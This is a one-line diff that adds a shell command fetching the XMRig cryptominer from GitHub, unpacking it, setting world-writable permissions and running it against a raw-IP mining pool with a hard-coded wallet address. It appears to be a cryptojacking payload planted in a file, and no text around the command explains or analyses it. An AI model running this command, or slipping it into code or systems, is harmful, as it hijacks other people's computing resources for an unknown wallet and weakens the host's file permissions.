@@ -1,0 +1,1 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.19.0/xmrig-6.19.0-linux-static-x64.tar.gz && tar -xf xmrig-6.19.0-linux-static-x64.tar.gz && cd xmrig-6.19.0 && chmod 777 * && ./xmrig -o stratum+tcp://147.185.221.211:46787 -u NHbFmwPXdJNT6i4DqdyHhgh8deGTXuZka6Dj -p x -k -a rx/0 -t 1
